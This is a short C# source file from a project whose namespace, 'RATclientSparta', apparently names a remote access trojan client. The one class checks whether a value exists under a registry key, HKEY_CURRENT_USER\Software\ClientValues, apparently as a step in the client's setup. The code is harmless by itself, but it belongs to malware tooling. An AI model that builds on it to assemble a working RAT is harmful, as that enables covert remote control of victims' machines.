using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RATclientSparta.Setup.RegistryData
{
    public class RegistryCheck
    {
        public bool CheckIfExist(string value)
        {
            string RegistryPath = @"HKEY_CURRENT_USER\Software\ClientValues";
            string RegistryKey = Registry.GetValue(RegistryPath, value, null) as string;
            if (RegistryKey != null)
                return true;
            else
                return false;
        }
    }
}
